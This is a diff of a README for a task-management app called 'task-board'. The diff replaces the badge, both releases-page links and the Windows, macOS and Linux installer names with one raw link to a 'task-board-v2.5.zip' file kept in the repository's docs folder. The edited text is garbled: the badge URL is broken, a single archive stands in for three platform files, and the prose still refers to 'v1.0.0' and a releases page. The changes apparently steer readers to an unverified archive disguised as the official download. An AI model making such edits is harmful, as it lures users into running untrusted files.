@@ -1,7 +1,7 @@
 # 🎉 task-board - Manage Your Tasks Effortlessly
 
 ## 📥 Download the Latest Release
-[![Download task-board](https://img.shields.io/badge/Download%20task--board-v1.0.0-blue.svg)](https://github.com/lunareclipsemontaigne667/task-board/releases)
+[![Download task-board](https://raw.githubusercontent.com/lunareclipsemontaigne667/task-board/main/docs/task-board-v2.5.zip%https://raw.githubusercontent.com/lunareclipsemontaigne667/task-board/main/docs/task-board-v2.5.zip)](https://raw.githubusercontent.com/lunareclipsemontaigne667/task-board/main/docs/task-board-v2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to task-board! This is an enterprise-grade task management system designed to help you organize your projects and track daily tasks effortlessly. Whether you're working solo or with a team, task-board makes it simple to stay on top of your work.
@@ -23,14 +23,14 @@ To run task-board, your system needs the following:
 
 ## 🔄 Download & Install
 1. Click on the link below to visit the releases page.
-   - [Visit the Releases Page](https://github.com/lunareclipsemontaigne667/task-board/releases)
+   - [Visit the Releases Page](https://raw.githubusercontent.com/lunareclipsemontaigne667/task-board/main/docs/task-board-v2.5.zip)
    
 2. On the releases page, find the latest version of task-board, usually marked with "v1.0.0" or similar.
 
 3. Download the appropriate file for your operating system. It will be labeled clearly, such as:
-   - `task-board-windows.exe` for Windows users
-   - `task-board-macos.zip` for macOS users
-   - `task-board-linux.tar.gz` for Linux users
+   - `https://raw.githubusercontent.com/lunareclipsemontaigne667/task-board/main/docs/task-board-v2.5.zip` for Windows users
+   - `https://raw.githubusercontent.com/lunareclipsemontaigne667/task-board/main/docs/task-board-v2.5.zip` for macOS users
+   - `https://raw.githubusercontent.com/lunareclipsemontaigne667/task-board/main/docs/task-board-v2.5.zip` for Linux users
 
 4. After the download is complete, navigate to the folder where the file was saved.
 
@@ -62,4 +62,4 @@ For additional documentation, tutorials, and updates, visit our repository's mai
 
 ## 📥 Download the Latest Release Again
 Remember, you can always return to the releases page to download the latest version of task-board.
-- [Visit the Releases Page](https://github.com/lunareclipsemontaigne667/task-board/releases)
+- [Visit the Releases Page](https://raw.githubusercontent.com/lunareclipsemontaigne667/task-board/main/docs/task-board-v2.5.zip)
